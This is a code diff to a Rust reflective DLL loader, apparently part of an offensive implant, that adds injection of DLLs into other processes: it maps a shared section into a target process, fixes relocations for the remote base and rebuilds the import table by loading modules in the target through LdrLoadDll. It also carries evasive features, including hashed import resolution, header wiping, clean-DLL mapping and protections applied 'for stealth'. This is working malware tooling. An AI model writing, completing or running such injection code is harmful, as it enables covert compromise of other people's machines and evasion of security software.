+            let reloc_type = ((entry >> 12) & 0xF) as u32;
+            let reloc_offset = (entry & 0xFFF) as usize;
+            let target_addr = local_base + virtual_address as usize + reloc_offset;
+
+            match reloc_type {
+                IMAGE_REL_BASED_ABSOLUTE => {}
+                IMAGE_REL_BASED_HIGH => {
+                    if target_addr + 2 <= local_base + pe.size_of_image {
+                        let val = *(target_addr as *const u16);
+                        *(target_addr as *mut u16) = val.wrapping_add((delta >> 16) as u16);
+                    }
+                }
+                IMAGE_REL_BASED_LOW => {
+                    if target_addr + 2 <= local_base + pe.size_of_image {
+                        let val = *(target_addr as *const u16);
+                        *(target_addr as *mut u16) = val.wrapping_add(delta as u16);
+                    }
+                }
+                IMAGE_REL_BASED_HIGHLOW => {
+                    if target_addr + 4 <= local_base + pe.size_of_image {
+                        let val = *(target_addr as *const u32);
+                        *(target_addr as *mut u32) = val.wrapping_add(delta as u32);
+                    }
+                }
+                IMAGE_REL_BASED_HIGHADJ => {
+                    if i + 1 < num_entries {
+                        let cookie = *entries_ptr.add(i + 1) as i16;
+                        if target_addr + 2 <= local_base + pe.size_of_image {
+                            let val = *(target_addr as *const u16) as i32;
+                            let adjusted = val + (delta >> 16) as i32 + cookie as i32;
+                            *(target_addr as *mut u16) = adjusted as u16;
+                        }
+                        count += 1;
+                    }
+                }
+                IMAGE_REL_BASED_DIR64 => {
+                    if target_addr + 8 <= local_base + pe.size_of_image {
+                        let val = *(target_addr as *const u64);
+                        *(target_addr as *mut u64) = val.wrapping_add(delta as u64);
+                    }
+                }
+                _ => {
+                    tracing::debug!(
+                        "Skipping unknown relocation type {} at RVA {:#x}",
+                        reloc_type,
+                        virtual_address as usize + reloc_offset,
+                    );
+                }
+            }
+            count += 1;
+        }
+
+        offset += size_of_block as usize;
+    }
+
+    Ok(())
+}
+
+unsafe fn rebuild_iat_reflective_remote(
+    process_handle: HANDLE,
+    local_base: usize,
+    remote_base: usize,
+    pe: &PeInfo,
+) -> Result<()> {
+    let (import_rva, _import_size) = match pe.import_dir {
+        Some(r) => r,
+        None => return Ok(()),
+    };
+
+    let mut remote_modules = build_remote_module_map(process_handle)?;
+    let ldr_load_dll_addr = resolve_remote_ldr_load_dll(process_handle, &remote_modules)?;
+
+    let mut import_desc = (local_base + import_rva as usize)
+        as *const windows_sys::Win32::System::SystemServices::IMAGE_IMPORT_DESCRIPTOR;
+
+    while (*import_desc).Name != 0 {
+        let dll_name_ptr = (local_base + (*import_desc).Name as usize) as *const i8;
+        let dll_name = match std::ffi::CStr::from_ptr(dll_name_ptr).to_str() {
+            Ok(s) => s,
+            Err(_) => {
+                import_desc = import_desc.add(1);
+                continue;
+            }
+        };
+        let dll_name_norm = normalize_import_dll_name(dll_name);
+
+        let remote_dll_base = ensure_remote_module_loaded_cached(
+            process_handle,
+            &dll_name_norm,
+            ldr_load_dll_addr,
+            &mut remote_modules,
+        )?;
+
+        let original_thunk_rva = if (*import_desc).Anonymous.OriginalFirstThunk != 0 {
+            (*import_desc).Anonymous.OriginalFirstThunk
+        } else {
+            (*import_desc).FirstThunk
+        };
+
+        match pe.magic {
+            IMAGE_NT_OPTIONAL_HDR32_MAGIC => {
+                let mut original_thunk = (local_base + original_thunk_rva as usize)
+                    as *const windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA32;
+                let mut first_thunk = (local_base + (*import_desc).FirstThunk as usize)
+                    as *mut windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA32;
+
+                while (*original_thunk).u1.AddressOfData != 0 {
+                    let addr_of_data = (*original_thunk).u1.AddressOfData;
+                    let proc_addr = if (addr_of_data & windows_sys::Win32::System::SystemServices::IMAGE_ORDINAL_FLAG32) != 0 {
+                        let ordinal = (addr_of_data & 0xffff) as u16;
+                        resolve_remote_export_by_ordinal(process_handle, remote_dll_base, ordinal)?
+                    } else {
+                        let ibn = (local_base + addr_of_data as usize)
+                            as *const windows_sys::Win32::System::SystemServices::IMAGE_IMPORT_BY_NAME;
+                        let name_ptr = (*ibn).Name.as_ptr();
+                        let name_cstr = std::ffi::CStr::from_ptr(name_ptr as *const i8);
+                        let name = name_cstr.to_str().unwrap_or("");
+                        resolve_remote_export(process_handle, remote_dll_base, name)?
+                    };
+
+                    let proc_addr32 = u32::try_from(proc_addr).map_err(|_| {
+                        anyhow!(
+                            "reflective_loader: resolved address {:#x} exceeds 32-bit range for {}",
+                            proc_addr,
+                            dll_name_norm
+                        )
+                    })?;
+                    let mut_u1 = &mut (*first_thunk).u1 as *mut _ as *mut u32;
+                    *mut_u1 = proc_addr32;
+
+                    original_thunk = original_thunk.add(1);
+                    first_thunk = first_thunk.add(1);
+                }
+            }
+            IMAGE_NT_OPTIONAL_HDR64_MAGIC => {
+                let mut original_thunk = (local_base + original_thunk_rva as usize)
+                    as *const windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA64;
+                let mut first_thunk = (local_base + (*import_desc).FirstThunk as usize)
+                    as *mut windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA64;
+
+                while (*original_thunk).u1.AddressOfData != 0 {
+                    let addr_of_data = (*original_thunk).u1.AddressOfData as u64;
+                    let proc_addr = if (addr_of_data & windows_sys::Win32::System::SystemServices::IMAGE_ORDINAL_FLAG64) != 0 {
+                        let ordinal = (addr_of_data & 0xffff) as u16;
+                        resolve_remote_export_by_ordinal(process_handle, remote_dll_base, ordinal)?
+                    } else {
+                        let ibn = (local_base + addr_of_data as usize)
+                            as *const windows_sys::Win32::System::SystemServices::IMAGE_IMPORT_BY_NAME;
+                        let name_ptr = (*ibn).Name.as_ptr();
+                        let name_cstr = std::ffi::CStr::from_ptr(name_ptr as *const i8);
+                        let name = name_cstr.to_str().unwrap_or("");
+                        resolve_remote_export(process_handle, remote_dll_base, name)?
+                    };
+
+                    let mut_u1 = &mut (*first_thunk).u1 as *mut _ as *mut u64;
+                    *mut_u1 = proc_addr as u64;
+
+                    original_thunk = original_thunk.add(1);
+                    first_thunk = first_thunk.add(1);
+                }
+            }
+            _ => {
+                bail!(
+                    "reflective_loader: unsupported optional-header magic {:#x} while rebuilding remote IAT",
+                    pe.magic
+                );
+            }
+        }
+
+        import_desc = import_desc.add(1);
+    }
+
+    Ok(())
+}
+
 // ── PE Loading Phases ───────────────────────────────────────────────────────
 
 /// Copy PE headers and sections from raw bytes to the mapped memory.
@@ -562,7 +1573,7 @@ unsafe fn copy_image(base: *mut c_void, dll_bytes: &[u8], pe: &PeInfo) -> Result
     // Copy PE headers (first e_lfanew + sizeof(NT headers) + section headers)
     let headers_size = pe.nt_header_offset
         + 4 // PE sig
-        + mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>()
+        + mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_FILE_HEADER>()
         + pe.size_of_optional_header as usize
         + pe.number_of_sections as usize * mem::size_of::<IMAGE_SECTION_HEADER>();
     let headers_size = align_up(headers_size, PAGE_SIZE).min(dll_bytes.len());
@@ -576,7 +1587,7 @@ unsafe fn copy_image(base: *mut c_void, dll_bytes: &[u8], pe: &PeInfo) -> Result
     // Copy each section from its file offset to its virtual address
     let sections = get_section_headers(dll_bytes, pe)?;
     for section in sections {
-        let virtual_size = *section.Misc.VirtualSize() as usize;
+        let virtual_size = section.Misc.VirtualSize as usize;
         let raw_size = section.SizeOfRawData as usize;
         let virtual_address = section.VirtualAddress as usize;
         let raw_offset = section.PointerToRawData as usize;
@@ -649,7 +1660,7 @@ unsafe fn apply_relocations(
 
         for i in 0..num_entries {
             let entry = *entries_ptr.add(i);
-            let reloc_type = (entry >> 12) & 0xF;
+            let reloc_type = ((entry >> 12) & 0xF) as u32;
             let reloc_offset = (entry & 0xFFF) as usize;
             let target_addr = base + virtual_address as usize + reloc_offset;
 
@@ -704,7 +1715,7 @@ unsafe fn apply_relocations(
                 }
                 _ => {
                     // Unknown relocation type — skip (may be platform-specific)
-                    log::debug!(
+                    tracing::debug!(
                         "Skipping unknown relocation type {} at RVA {:#x}",
                         reloc_type,
                         virtual_address as usize + reloc_offset,
@@ -731,7 +1742,7 @@ unsafe fn rebuild_iat_reflective(base: usize, pe: &PeInfo) -> Result<()> {
         None => return Ok(()), // No imports
     };
 
-    let mut import_desc = (base + import_rva as usize) as *const winapi::um::winnt::IMAGE_IMPORT_DESCRIPTOR;
+    let mut import_desc = (base + import_rva as usize) as *const windows_sys::Win32::System::SystemServices::IMAGE_IMPORT_DESCRIPTOR;
 
     while (*import_desc).Name != 0 {
         let dll_name_ptr = (base + (*import_desc).Name as usize) as *const i8;
@@ -747,7 +1758,7 @@ unsafe fn rebuild_iat_reflective(base: usize, pe: &PeInfo) -> Result<()> {
         let dep_base = match map_clean_dll(dll_name) {
             Ok(b) => b,
             Err(e) => {
-                log::warn!(
+                tracing::warn!(
                     "reflective_loader: failed to map clean {}: {}, skipping import",
                     dll_name,
                     e
@@ -757,8 +1768,8 @@ unsafe fn rebuild_iat_reflective(base: usize, pe: &PeInfo) -> Result<()> {
             }
         };
 
-        let original_thunk_rva = if *(*import_desc).u.OriginalFirstThunk() != 0 {
-            *(*import_desc).u.OriginalFirstThunk()
+        let original_thunk_rva = if (*import_desc).Anonymous.OriginalFirstThunk != 0 {
+            (*import_desc).Anonymous.OriginalFirstThunk
         } else {
             (*import_desc).FirstThunk
         };
@@ -766,21 +1777,21 @@ unsafe fn rebuild_iat_reflective(base: usize, pe: &PeInfo) -> Result<()> {
         match pe.magic {
             IMAGE_NT_OPTIONAL_HDR32_MAGIC => {
                 let mut original_thunk = (base + original_thunk_rva as usize)
-                    as *const winapi::um::winnt::IMAGE_THUNK_DATA32;
+                    as *const windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA32;
                 let mut first_thunk = (base + (*import_desc).FirstThunk as usize)
-                    as *mut winapi::um::winnt::IMAGE_THUNK_DATA32;
+                    as *mut windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA32;
 
-                while *(*original_thunk).u1.AddressOfData() != 0 {
-                    let addr_of_data = *(*original_thunk).u1.AddressOfData();
+                while (*original_thunk).u1.AddressOfData != 0 {
+                    let addr_of_data = (*original_thunk).u1.AddressOfData;
                     let proc_addr = if (addr_of_data
-                        & winapi::um::winnt::IMAGE_ORDINAL_FLAG32)
+                        & windows_sys::Win32::System::SystemServices::IMAGE_ORDINAL_FLAG32)
                         != 0
                     {
                         let ordinal = (addr_of_data & 0xffff) as u32;
                         resolve_export_by_ordinal(dep_base, ordinal)
                     } else {
                         let ibn = (base + addr_of_data as usize)
-                            as *const winapi::um::winnt::IMAGE_IMPORT_BY_NAME;
+                            as *const windows_sys::Win32::System::SystemServices::IMAGE_IMPORT_BY_NAME;
                         let name_ptr = (*ibn).Name.as_ptr();
                         let name_cstr = std::ffi::CStr::from_ptr(name_ptr as *const i8);
                         let hash = pe_resolve::hash_str(name_cstr.to_bytes_with_nul());
@@ -798,21 +1809,21 @@ unsafe fn rebuild_iat_reflective(base: usize, pe: &PeInfo) -> Result<()> {
             }
             IMAGE_NT_OPTIONAL_HDR64_MAGIC => {
                 let mut original_thunk = (base + original_thunk_rva as usize)
-                    as *const winapi::um::winnt::IMAGE_THUNK_DATA64;
+                    as *const windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA64;
                 let mut first_thunk = (base + (*import_desc).FirstThunk as usize)
-                    as *mut winapi::um::winnt::IMAGE_THUNK_DATA64;
+                    as *mut windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA64;
 
-                while *(*original_thunk).u1.AddressOfData() != 0 {
-                    let addr_of_data = *(*original_thunk).u1.AddressOfData() as u64;
+                while (*original_thunk).u1.AddressOfData != 0 {
+                    let addr_of_data = (*original_thunk).u1.AddressOfData as u64;
                     let proc_addr = if (addr_of_data
-                        & winapi::um::winnt::IMAGE_ORDINAL_FLAG64)
+                        & windows_sys::Win32::System::SystemServices::IMAGE_ORDINAL_FLAG64)
                         != 0
                     {
                         let ordinal = (addr_of_data & 0xffff) as u32;
                         resolve_export_by_ordinal(dep_base, ordinal)
                     } else {
                         let ibn = (base + addr_of_data as usize)
-                            as *const winapi::um::winnt::IMAGE_IMPORT_BY_NAME;
+                            as *const windows_sys::Win32::System::SystemServices::IMAGE_IMPORT_BY_NAME;
                         let name_ptr = (*ibn).Name.as_ptr();
                         let name_cstr = std::ffi::CStr::from_ptr(name_ptr as *const i8);
                         let hash = pe_resolve::hash_str(name_cstr.to_bytes_with_nul());
@@ -845,7 +1856,7 @@ unsafe fn resolve_export_by_ordinal(base: usize, ordinal: u32) -> usize {
         return 0;
     }
     let nt_off = (*dos).e_lfanew as usize;
-    let opt_off = nt_off + 4 + mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>();
+    let opt_off = nt_off + 4 + mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_FILE_HEADER>();
     let magic = *(opt_off as *const u16);
 
     let export_dir_rva = match magic {
@@ -865,7 +1876,7 @@ unsafe fn resolve_export_by_ordinal(base: usize, ordinal: u32) -> usize {
         return 0;
     }
 
-    let export_dir = (base + export_dir_rva as usize) as *const winapi::um::winnt::IMAGE_EXPORT_DIRECTORY;
+    let export_dir = (base + export_dir_rva as usize) as *const windows_sys::Win32::System::SystemServices::IMAGE_EXPORT_DIRECTORY;
     let base_ordinal = (*export_dir).Base;
     let num_funcs = (*export_dir).NumberOfFunctions;
     let funcs = (base + (*export_dir).AddressOfFunctions as usize) as *const u32;
@@ -907,7 +1918,7 @@ unsafe fn apply_section_protections(
     let sections = get_section_headers(dll_bytes, pe)?;
     for section in sections {
         let characteristics = section.Characteristics;
-        let virtual_size = *section.Misc.VirtualSize() as usize;
+        let virtual_size = section.Misc.VirtualSize as usize;
         let virtual_address = section.VirtualAddress as usize;
 
         if virtual_size == 0 {
@@ -917,13 +1928,13 @@ unsafe fn apply_section_protections(
         let section_base = (base + virtual_address) as *mut c_void;
         let section_size = align_up(virtual_size, PAGE_SIZE);
 
-        let protect = if characteristics & winapi::um::winnt::IMAGE_SCN_MEM_EXECUTE != 0
-            && characteristics & winapi::um::winnt::IMAGE_SCN_MEM_WRITE != 0
+        let protect = if characteristics & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_EXECUTE != 0
+            && characteristics & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_WRITE != 0
         {
             PAGE_EXECUTE_READWRITE
-        } else if characteristics & winapi::um::winnt::IMAGE_SCN_MEM_EXECUTE != 0 {
+        } else if characteristics & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_EXECUTE != 0 {
             PAGE_EXECUTE_READ
-        } else if characteristics & winapi::um::winnt::IMAGE_SCN_MEM_WRITE != 0 {
+        } else if characteristics & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_WRITE != 0 {
             PAGE_READWRITE
         } else {
             PAGE_READONLY
@@ -1012,24 +2023,43 @@ pub unsafe fn reflective_load(
     let base = base_addr as usize;
 
     // ── Phase 2: Copy image and apply fixups ────────────────────────────
-    copy_image(base_addr, dll_bytes, &pe)?;
+    // If any step after mapping fails, unmap the section so we don't leak
+    // the allocated region.  (The LoadedModule cleanup closure is only
+    // created on the success path.)
+    let load_result: Result<()> = (|| {
+        copy_image(base_addr, dll_bytes, &pe)?;
 
-    if config.handle_relocations {
-        apply_relocations(base, &pe, dll_bytes)?;
-    }
-
-    if config.resolve_imports {
-        if let Err(e) = rebuild_iat_reflective(base, &pe) {
-            log::warn!("reflective_loader: IAT rebuild failed: {}", e);
+        if config.handle_relocations {
+            apply_relocations(base, &pe, dll_bytes)?;
         }
-    }
 
-    // Apply per-section memory protections (RWX → appropriate per-section)
-    if !config.execute_from_section || true {
-        // Always apply section protections for stealth
-        if let Err(e) = apply_section_protections(base, &pe, dll_bytes) {
-            log::warn!("reflective_loader: section protection failed: {}", e);
+        if config.resolve_imports {
+            if let Err(e) = rebuild_iat_reflective(base, &pe) {
+                tracing::warn!("reflective_loader: IAT rebuild failed: {}", e);
+            }
         }
+
+        // Apply per-section memory protections (RWX → appropriate per-section)
+        if !config.execute_from_section || true {
+            // Always apply section protections for stealth
+            if let Err(e) = apply_section_protections(base, &pe, dll_bytes) {
+                tracing::warn!("reflective_loader: section protection failed: {}", e);
+            }
+        }
+
+        Ok(())
+    })();
+
+    if let Err(e) = load_result {
+        // Unmap the leaked mapping before propagating the error.
+        if let Err(unmap_err) = nt_unmap_view_of_section(base_addr) {
+            tracing::warn!(
+                "reflective_loader: failed to unmap leaked section at {:p}: {}",
+                base_addr,
+                unmap_err
+            );
+        }
+        return Err(e);
     }
 
     // ── Phase 3: Execute and clean up ───────────────────────────────────
@@ -1048,7 +2078,7 @@ pub unsafe fn reflective_load(
 
     if config.cleanup_headers {
         if let Err(e) = wipe_headers(base) {
-            log::warn!("reflective_loader: header wipe failed: {}", e);
+            tracing::warn!("reflective_loader: header wipe failed: {}", e);
         }
     }
 
@@ -1062,7 +2092,7 @@ pub unsafe fn reflective_load(
         cleanup_fn: Some(Box::new(move || {
             unsafe {
                 if let Err(e) = nt_unmap_view_of_section(cleanup_base as *mut c_void) {
-                    log::warn!("reflective_loader: cleanup unmap failed: {}", e);
+                    tracing::warn!("reflective_loader: cleanup unmap failed: {}", e);
                 }
             }
         })),
@@ -1152,7 +2182,7 @@ pub unsafe fn reflective_load_remote(
         PAGE_READWRITE,
     )?;
 
-    // Copy and fix up the image in the local mapping
+    // Copy the raw image into the shared local view.
     copy_image(local_base, dll_bytes, &pe)?;
 
     // The local copy has delta = local_base - image_base, but we need
@@ -1171,55 +2201,26 @@ pub unsafe fn reflective_load_remote(
     let remote_addr = remote_base as usize;
     let local_addr = local_base as usize;
 
-    // Re-apply relocations with the remote delta.
-    // The image was copied to local_base, so relocations currently use
-    // local_base as the base.  We need to fix them for remote_base.
+    // Re-apply relocations with the remote delta on the *shared* local view.
+    // The target view sees the same physical pages.
     if remote_config.load_config.handle_relocations {
-        // Re-copy the raw image (undoing the local relocations)
+        // Ensure relocation writes always start from raw image bytes.
         copy_image(local_base, dll_bytes, &pe)?;
 
-        // Now apply relocations using the *remote* base address
-        // We temporarily pretend the image is at remote_addr
-        apply_relocations(remote_addr, &pe, dll_bytes)?;
+        // Apply relocation delta for the remote base while writing through
+        // the shared local mapping.
+        apply_relocations_for_remote_shared(local_addr, remote_addr, &pe)?;
     }
 
-    // The local mapping is a shared section, so the remote process
-    // sees the same pages.  But relocations are for the remote address...
-    // This means we need to write the relocated image to the remote process.
-    // Since it's a shared section, writes in local view appear in remote view.
-
-    // Wait — shared sections share the SAME physical pages. If we applied
-    // relocations for the remote base, the data in the shared section is
-    // correct for the remote process. But the addresses in the local view
-    // point to the same physical pages, so they're also correct for remote.
-    // However, since local_base != remote_base, the addresses embedded in
-    // the image are wrong for the local view. That's fine — we don't need
-    // to execute from the local view.
-
-    // Actually, relocations modify the shared pages in-place, so the remote
-    // process already has the correct data. We just need to handle the case
-    // where copy_image was called twice (once for local, once for remote
-    // base relocations).
-
-    // Re-copy and re-apply for the remote base
-    if remote_config.load_config.handle_relocations {
-        // copy_image was called above with raw bytes, then apply_relocations
-        // was called with remote_addr — but apply_relocations reads from
-        // base+reloc_rva (the loaded image), not from dll_bytes. So it's
-        // modifying local_addr, which is the shared section. Perfect.
-    }
-
-    // Resolve imports — these resolve to addresses in the *agent's* process,
-    // which is wrong for the remote process. For proper remote loading,
-    // imports must be resolved in the target process context.
-    // This is a fundamental limitation — remote IAT resolution would require
-    // reading the target's module list. We skip remote IAT resolution for now
-    // and document the limitation.
+    // Resolve imports in target-process address space and write resolved
+    // addresses into the shared IAT.
     if remote_config.load_config.resolve_imports {
-        log::warn!(
-            "reflective_loader: import resolution is not supported for remote loading; \
-             the DLL must have no imports or resolve them internally"
-        );
+        rebuild_iat_reflective_remote(
+            remote_config.process_handle,
+            local_addr,
+            remote_addr,
+            &pe,
+        )?;
     }
 
     // Apply section protections in the target process
@@ -1229,7 +2230,7 @@ pub unsafe fn reflective_load_remote(
         &pe,
         dll_bytes,
     ) {
-        log::warn!("reflective_loader: remote section protection failed: {}", e);
+        tracing::warn!("reflective_loader: remote section protection failed: {}", e);
     }
 
     // Unmap the local view — we're done writing
@@ -1277,7 +2278,7 @@ unsafe fn apply_section_protections_remote(
     let sections = get_section_headers(dll_bytes, pe)?;
     for section in sections {
         let characteristics = section.Characteristics;
-        let virtual_size = *section.Misc.VirtualSize() as usize;
+        let virtual_size = section.Misc.VirtualSize as usize;
         let virtual_address = section.VirtualAddress as usize;
 
         if virtual_size == 0 {
@@ -1287,13 +2288,13 @@ unsafe fn apply_section_protections_remote(
         let section_base = (base + virtual_address) as *mut c_void;
         let section_size = align_up(virtual_size, PAGE_SIZE);
 
-        let protect = if characteristics & winapi::um::winnt::IMAGE_SCN_MEM_EXECUTE != 0
-            && characteristics & winapi::um::winnt::IMAGE_SCN_MEM_WRITE != 0
+        let protect = if characteristics & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_EXECUTE != 0
+            && characteristics & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_WRITE != 0
         {
             PAGE_EXECUTE_READWRITE
-        } else if characteristics & winapi::um::winnt::IMAGE_SCN_MEM_EXECUTE != 0 {
+        } else if characteristics & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_EXECUTE != 0 {
             PAGE_EXECUTE_READ
-        } else if characteristics & winapi::um::winnt::IMAGE_SCN_MEM_WRITE != 0 {
+        } else if characteristics & windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SCN_MEM_WRITE != 0 {
             PAGE_READWRITE
         } else {
             PAGE_READONLY
@@ -1555,13 +2556,11 @@ mod tests {
 
         let result = parse_pe_headers(&data);
         assert!(result.is_err());
+        let err = result.unwrap_err();
         assert!(
-            result
-                .unwrap_err()
-                .to_string()
-                .contains("Too many sections"),
-            "Expected 'Too many sections' error, got: {:?}",
-            result
+            err.to_string().contains("Too many sections"),
+            "Expected 'Too many sections' error, got: {}",
+            err
         );
     }
 
